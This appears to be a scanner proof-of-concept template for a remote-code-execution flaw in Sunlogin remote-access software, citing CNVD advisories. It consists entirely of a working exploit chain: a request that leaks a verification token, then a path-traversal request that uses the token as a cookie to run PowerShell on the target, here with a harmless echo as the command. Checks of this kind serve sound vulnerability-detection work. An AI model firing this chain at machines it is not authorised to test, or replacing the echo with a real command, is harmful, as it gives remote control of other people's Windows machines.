name: poc-yaml-sunlogin-rce
transport: http
set:
  rand: randomLowercase(5)
rules:
  r0:
    request:
      method: GET
      path: /
    expression: response.status == 200 && response.content_type.contains("application/json") && response.body.bcontains(b"{\"success\":false,\"msg\":\"Verification failure\"}")
  r1:
    request:
      method: POST
      path: /cgi-bin/rpc
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: "action=verify-haras"
    expression: response.status == 200 && response.body.bcontains(b"verify_string")
    output:
      search: '"\\\"verify_string\\\"\\:\\\"(?P<verify_string>.+?)\\\"\\,".bsubmatch(response.body)'
      verify_string: search["verify_string"]
  r2:
    request:
      method: GET
      path: /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+echo%20{{rand}}
      headers:
        Cookie: CID={{verify_string}}
    expression: response.status == 200 && response.body.bcontains(bytes(rand))
expression: r0() && r1() && r2()
detail:
  author: yggo(https://github.com/yggo)
  links:
    - https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270
    - https://www.cnvd.org.cn/flaw/show/CNVD-2022-03672